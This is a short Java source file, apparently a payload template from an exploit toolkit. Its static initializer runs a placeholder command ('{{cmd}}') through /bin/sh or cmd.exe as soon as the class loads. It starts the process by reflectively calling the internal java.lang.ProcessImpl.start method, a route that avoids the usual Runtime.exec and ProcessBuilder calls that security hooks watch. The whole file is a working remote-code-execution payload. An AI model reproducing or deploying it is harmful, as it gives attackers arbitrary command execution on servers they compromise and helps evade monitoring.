package payload;

import java.io.File;
import java.lang.reflect.Method;
import java.util.Map;
import java.lang.ProcessBuilder;
public class ProcessImplExec  {
    static {
        String cmd = "{{cmd}}";
        String[] var1;
        if (File.separator.equals("/")) {
            var1 = new String[]{"/bin/sh", "-c", cmd};
        } else {
            var1 = new String[]{"cmd", "/C", cmd};
        }
        try {
            Class clazz = Class.forName("java.lang.ProcessImpl");
            Method start = clazz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
            start.setAccessible(true);
            start.invoke(null, var1, null, null, null, false);
        } catch (Exception var3) {
            var3.printStackTrace();
        }
    }
}
